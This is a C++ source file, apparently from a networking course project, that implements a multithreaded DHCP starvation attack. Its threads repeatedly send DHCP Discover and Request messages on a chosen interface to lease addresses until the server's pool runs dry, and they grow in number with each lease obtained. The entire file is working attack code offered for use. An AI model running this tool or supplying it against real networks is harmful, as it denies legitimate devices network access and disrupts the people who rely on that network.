#include "pds-dhcpstarve.h"
#include "pds-dhcpCore.h"

std::mutex socketMutex, threadNumberMutex, errorCounter;// ipAddressMutex;
int volatile threadCounter = 0;
int volatile currentThreadCountMax = MAX_THREADS_COUNT;
int volatile errorCount = 0;

bool volatile sigIntCatched = false;

int currentErrorCount(int value = 1)
{
	std::lock_guard<std::mutex> guard(errorCounter);
	errorCount += value;

	return errorCount;
}

int getNumberOfThreads()
{
	std::lock_guard<std::mutex> guard(threadNumberMutex);
	return threadCounter;
}

int freeThreadsToMaxCount()
{
	std::lock_guard<std::mutex> guard(threadNumberMutex);
	int ret = 0;
	if (threadCounter < currentThreadCountMax)
	{	
		ret = currentThreadCountMax - threadCounter;
		threadCounter = currentThreadCountMax;
	}
	return ret;
}

void decreaseThreadCounter(int value = 1)
{
	std::lock_guard<std::mutex> guard(threadNumberMutex);
	threadCounter -= value;
}

void addToMaxThreadCount(int value)
{
	std::lock_guard<std::mutex> guard(threadNumberMutex);
	currentThreadCountMax += value;
	if(currentThreadCountMax < 1)	// at least 1 thread is always available
		currentThreadCountMax = 1;
	if(currentThreadCountMax > MAX_THREADS_COUNT)	// do not go over max thread limit
		currentThreadCountMax = MAX_THREADS_COUNT;
}


int sendMessage(int socket, unsigned char* message, int messageLength, sockaddr* serverSettings)
{
	std::lock_guard<std::mutex> guard(socketMutex);
	sendto(socket, message, messageLength, 0, serverSettings, sizeof(sockaddr));
}

int tryGetMessage(int socket, unsigned char* message, int &messageLength, uint32_t xid)
{
	std::lock_guard<std::mutex> guard(socketMutex);

	// address of dhcp server -> filled together with response
	sockaddr_in si_other;
	unsigned slen = sizeof(sockaddr);
	int receivedSize = recvfrom(socket, message, messageLength, MSG_PEEK | MSG_DONTWAIT, (sockaddr *)&si_other, &slen);
	if(xid == DHCPCore::getXID(message, receivedSize))
	{
		messageLength = recvfrom(socket, message, messageLength, MSG_DONTWAIT, (sockaddr *)&si_other, &slen);
		return 1;
	}
	return 0;
}


void dhcpStarveClient(int socket, struct sockaddr_in &serverSettings, int threadNumber)
{
	// create instance of dhcp starve core class
	DHCPCore* dhcpCoreInstance = new DHCPCore(threadNumber);
	// create DHCP Discover message
	dhcpCoreInstance->createDHCPDiscoverMessage();
	if (dhcpCoreInstance->isError())
	{
		std::cout << "FLAG1" << std::endl;
		// error occured tidy up and exit
		delete(dhcpCoreInstance);
		return;
	}
	// send message
	//sendto(senderSocket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), 0, (sockaddr*)&serverSettings, sizeof(serverSettings));
	sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);

	// start timer to check if we already do not wait to long for offer
	auto timeStart = std::chrono::high_resolution_clock::now();
	// get the response -> is blocking if no response, the code will get stack
	// TO-DO: Check what happend if pool is dried out
	unsigned char message[ETHERNET_MTU];
	int messageLength = ETHERNET_MTU;
	// wait for DHCPOFFER	
	while(true)
	{
		// check if SIGINT
		if(sigIntCatched) 
		{
			delete(dhcpCoreInstance);
			fprintf(stdout, "Catched SIGINT, terminating thread: %d.\n", threadNumber);
			decreaseThreadCounter();
			return;
		}
		std::memset(&message, 0, sizeof(message));
		int forMe = tryGetMessage(socket, message, messageLength, dhcpCoreInstance->getCurrentXID());
		if(forMe)
		{
			if(dhcpCoreInstance->getState() == DHCP_TYPE_DISCOVER)
			{
				// load response to dhcp_packet struct
				dhcpCoreInstance->ProcessDHCPOfferMessage(message, messageLength);
				if (dhcpCoreInstance->isError())
				{
					// error occured tidy up and exi
					delete(dhcpCoreInstance);
					decreaseThreadCounter(); 
					return;
				}
				sendMessage(socket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), (sockaddr*)&serverSettings);
			}
			else if(dhcpCoreInstance->getState() == DHCP_TYPE_REQUEST)
			{
				dhcpCoreInstance->ProcessDHCPAckMessage(message, messageLength);
				if (dhcpCoreInstance->isError())
				{
					// error occured tidy up and exi
					delete(dhcpCoreInstance);
					decreaseThreadCounter();
					return;
				}
				// check if ack obtained
				if(dhcpCoreInstance->getState() == DHCP_TYPE_ACK)
				{
					uint32_t ipAddr = dhcpCoreInstance->getOfferedIPAddress();
					char str[INET_ADDRSTRLEN];
					inet_ntop(AF_INET, &ipAddr, str, INET_ADDRSTRLEN);
					fprintf(stdout, "Thread %d:IP address:%s, obtained!\n", threadNumber, str);
					// successful, increase the number of threads
					addToMaxThreadCount(1);
					delete(dhcpCoreInstance);
					decreaseThreadCounter();
					return;
				}
			}
		}
		// not my packet, try again in a time or end if we waited too long
		// check if wait more
		std::chrono::duration<double, std::milli> ms = std::chrono::high_resolution_clock::now() - timeStart;
		if(ms.count() > WAIT_FOR_RESPONSE_TIME)
		{
			//fprintf(stderr, "Time out for offer!\n");
			currentErrorCount(1);
			// time out, decrease the number of threads
			addToMaxThreadCount(-1);
			delete(dhcpCoreInstance);
			decreaseThreadCounter();
			return;
		} 
		// sleep for a while
		std::this_thread::sleep_for(std::chrono::milliseconds(WAIT_BEFORE_CHECK_SOCKET_AGAIN));
	}

	// clean and exit thread
	delete(dhcpCoreInstance);
	decreaseThreadCounter();
	return;
}

void sigIntSet(int s)
{
	if (s == SIGINT)
		sigIntCatched = true;
}

int main(int argc, char* argv[])
{
	// ctrl + c signal catching set
	struct sigaction sigIntHandler;
	sigIntHandler.sa_handler = sigIntSet;
	sigemptyset(&sigIntHandler.sa_mask);
	sigIntHandler.sa_flags = 0;
	sigaction(SIGINT, &sigIntHandler, NULL);

	// parse the parameters using getopt
	std::string chosenInterface = "";
	int c;
	bool errorFlag = false;

	if (argc != 3) {
		std::cerr << "Incorrect number of params, exiting program." << std::endl;
		return INCORRECT_PARAMS;
	}

	while ((c = getopt(argc, argv, "i:")) != -1) {
		switch (c) {
		case 'i':
			chosenInterface = optarg;
			break;
		case ':':
			std::cerr << "Option -" << optopt << "requires an operand" << std::endl;
			errorFlag = true;
			break;
		case '?':
			std::cerr << "Unrecognized option: " << optopt << std::endl;
			errorFlag = true;
			break;
		}
	}

	if (errorFlag || chosenInterface.empty()) {
		std::cerr << "Incorrect params, exiting program." << std::endl;
		return INCORRECT_PARAMS;
	}

	std::cout << "Interface: " << chosenInterface << std::endl;


	// SOCKET FOR SENDING --------------------------------------------------------------------
	// create socket and send message 
	int senderSocket = 0;
	if ((senderSocket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		fprintf(stderr, "Cannot create socket.");
		exit(1);
	}

	// bind socket to given interface
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, chosenInterface.c_str(), sizeof(ifr.ifr_name));
	if(setsockopt(senderSocket, SOL_SOCKET, SO_BINDTODEVICE, (void*)&ifr, sizeof(ifr)) < 0)
	{
		fprintf(stderr, "Cannot assign socket to interface: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}
	// enable broadcast on socket
	int optVal = 1;
	if(setsockopt(senderSocket, SOL_SOCKET, SO_BROADCAST, &optVal, sizeof(optVal)) < 0)
	{
		fprintf(stderr, "Cannot set socket to broadcast: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}
	if(setsockopt(senderSocket, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0)
	{
		fprintf(stderr, "Cannot set socket to broadcast: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}	
	struct sockaddr_in interfaceSettings;
	// set parameter and bind to socket to specific interface
	interfaceSettings.sin_family = AF_INET;
	interfaceSettings.sin_port = htons(DHCP_CLIENT_PORT);
	interfaceSettings.sin_addr.s_addr = INADDR_ANY;
	if (bind(senderSocket, (sockaddr*)&interfaceSettings, sizeof(interfaceSettings)) < 0)
	{ // cannot bind socket to given address and port
		fprintf(stderr, "Cannot bind socket to interface: %s. %s\n", chosenInterface.c_str(), strerror(errno));
		exit(1);
	}
	
	// set parameters for server address and connect socket to it
	struct sockaddr_in serverSettings;
	memset(&serverSettings, 0, sizeof(serverSettings));
	serverSettings.sin_family = AF_INET;
	serverSettings.sin_port = htons(DHCP_SERVER_PORT);
	// set IPv4 broadcast
	if ((inet_pton(AF_INET, DHCP_SERVER_ADDRESS, &serverSettings.sin_addr)) <= 0)
	{
		fprintf(stderr, "Cannot set server address (%s) -> inet_pton error.\n", DHCP_SERVER_ADDRESS);
		exit(1);
	}

	// --------------------------- COMMUNICATION START -------------------------------------------------
	//int ret = dhcpStarveClient(senderSocket, serverSettings);
	int threadNumber = 0;
	while(currentErrorCount(0) < STOP_TIMEOUT_LIMIT || STOP_TIMEOUT_LIMIT == -1)
	{
		if(sigIntCatched)
		{
			break;
		}
		int threadAvailable = freeThreadsToMaxCount();
		for (auto i = 0; i < threadAvailable; ++i)
		{
			std::thread(dhcpStarveClient, senderSocket, std::ref(serverSettings), ++threadNumber).detach();
		}
		// sleep for one second, before trying to create more threads
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

	// wait until all threads are finished, to not close socket before they react on SIGINT
	while(true)
	{
		if(getNumberOfThreads() <= 0)
		{
			close(senderSocket);
			fprintf(stdout, "Terminating main thread, closing socket.\n");
			break;
		}
	}

	exit(0);
}
